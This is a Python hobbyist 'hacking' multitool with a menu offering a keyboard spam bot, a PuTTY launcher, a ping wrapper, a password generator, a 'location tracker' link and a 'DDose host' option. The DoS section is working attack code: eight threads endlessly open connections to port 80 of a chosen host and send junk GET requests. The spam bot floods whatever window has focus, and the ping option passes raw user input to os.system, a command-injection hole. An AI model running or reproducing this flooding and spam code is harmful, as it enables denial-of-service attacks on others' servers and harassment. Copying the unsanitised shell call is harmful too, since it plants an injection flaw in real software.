import pyautogui
import time
from keyboard import press
from time import sleep
import pyautogui
import os
import random
import subprocess
import argparse
import socket
from threading import Thread


print('''
 $$$$$$\                                                    $$\     $$\                     
$$  __$$\                                                   $$ |    \__|                    
$$ /  $$ |$$\   $$\  $$$$$$\   $$$$$$\  $$$$$$\  $$$$$$$\ $$$$$$\   $$\ $$$$$$$\   $$$$$$\  
$$ |  $$ |$$ |  $$ | \____$$\ $$  __$$\ \____$$\ $$  __$$\\_$$  _|  $$ |$$  __$$\ $$  __$$\ 
$$ |  $$ |$$ |  $$ | $$$$$$$ |$$ |  \__|$$$$$$$ |$$ |  $$ | $$ |    $$ |$$ |  $$ |$$$$$$$$ |
$$ $$\$$ |$$ |  $$ |$$  __$$ |$$ |     $$  __$$ |$$ |  $$ | $$ |$$\ $$ |$$ |  $$ |$$   ____|
\$$$$$$ / \$$$$$$  |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  $$ | \$$$$  |$$ |$$ |  $$ |\$$$$$$$\ 
 \___$$$\  \______/  \_______|\__|      \_______|\__|  \__|  \____/ \__|\__|  \__| \_______|
     \___|                                                                                  
                                                                                        ''')
print("                             by ~iloveh$cking~                                    ")
print("1 : spamm bot                                                            2 : PuTTY")
print("                                                                                  ")
print("3 : ip pinger                                                     4 : password gen")
print("                                                                                  ")
print("5 : DDose host                                                6 : location tracker")




userinput = input()





#/////////////////////////////////////////////////spambot/////////////////////////////////////////////////////////////////////////
if userinput == "1":
    def main(): #main function
        os.system('cls')

    spam = input("Enter your spam text:\n-> ")  
    num = input("\nNumber of times to spam (Leave it for if you want it to spam forever):\n-> ") 
    if num == "": 
        num = 999999

    print('\nThe spam will begin in 10 seconds... ')
    print("Return to this window and press 'ctrl/cmd + c' to stop the spam anytime")
    sleep(10)

    for _ in range(int(num)):
        sleep(0.3)
        pyautogui.typewrite(spam) 
        press('enter') 
    
    end()








#///////////////////////////////////////////////////ip pinger////////////////////////////////////////////////////////////////////////


if userinput == "3":
    ip_to_check = input("ip to ping:\n->")

    os.system('ping -n 4 {}'.format(ip_to_check))


#///////////////////////////////////////////////////password gen////////////////////////////////////////////////////////////////////

if userinput == "4":
 
    kleinB='qwertzuiopüasdfghjklöäyxcvbnm'
    kleinB=list(kleinB)
    großB='QWERTZUIOPÜASDFGHJKLÖÄYXCVBNM'
    großB=list(großB)
    sonderZ='!"§$%&/()=?*+#-.,;:_<>'
    sonderZ=list(sonderZ)
 
    length= input("how long: ")
    kB= True if input("Lowercase(y/n): ")=="y" else False
    gB= True if input("capital letter(y/n): ")=="y" else False
    sZ= True if input("special character(y/n): ")=="y" else False
 
    paramterListe= []
    if kB:
        paramterListe.append(kleinB)
    if gB:
        paramterListe.append(großB)
    if sZ:
        paramterListe.append(sonderZ)
 
 
    pw=""
    for i in range(0,int(length)):
        pw+=random.choice(random.choice(paramterListe))
    print("Passwort: "+pw)


#////////////////////////////////////////////////puTTY/////////////////////////////////////////////////////////////////////////////////////

if userinput == "2":
    command = "putty.exe"
    subprocess.Popen(command)

#//////////////////////////////////////////////////////////DDOS///////////////////////////////////////////////////////////////////////////

if userinput == "5":
    host = input("witch ip:\n-> ")
    ip = socket.gethostbyname(host)
    port = 80
    print("attcking ..." + ip)
    

    def dos():
        while True:
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                mysocket.connect((ip, port))
                mysocket.send(str.encode("GET " + "lol ich bin dabei" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "lol ich bin dabei" + "HTTP/1.1 \r\n"), (ip, port))
            except socket.error:
                print("error")
            mysocket.close()

    for i in range(8):
        t = Thread(target=dos)
        t.start()


#/////////////////////////////////////////location tracer/////////////////////////////////////////////////////////////////////


if userinput == "6":
    command = "start https://www.iplocation.net"
    subprocess.Popen(command)
    
    
